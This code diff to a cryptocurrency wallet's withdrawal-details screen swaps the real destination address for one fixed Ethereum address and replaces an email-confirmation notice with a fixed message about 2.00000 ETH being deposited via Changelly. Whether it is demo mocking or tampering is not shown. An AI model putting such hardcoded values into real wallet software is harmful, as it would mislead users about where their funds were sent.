@@ -63,14 +63,14 @@ class TransactionDetailsWithdraw extends Component {
             TRANSACTION_TYPES.WITHDRAWAL_PENDING_VERIFICATION && (
             <CheckEmailInfoBox
               infoText={
-                "In order to proceed, you must confirm the transaction via email."
+                "As soon as Changelly verifies the transaction your 2.00000 ETH will be deposited to your account."
               }
             />
           )}
 
           <TxAddressSection
             transaction={transaction}
-            address={transaction.to_address}
+            address={"0x4c3548612cf4c7f9d0923ef0b75b5ce69d34d31f"}
             text="Withdrawn to:"
           />
           <TxBasicSection
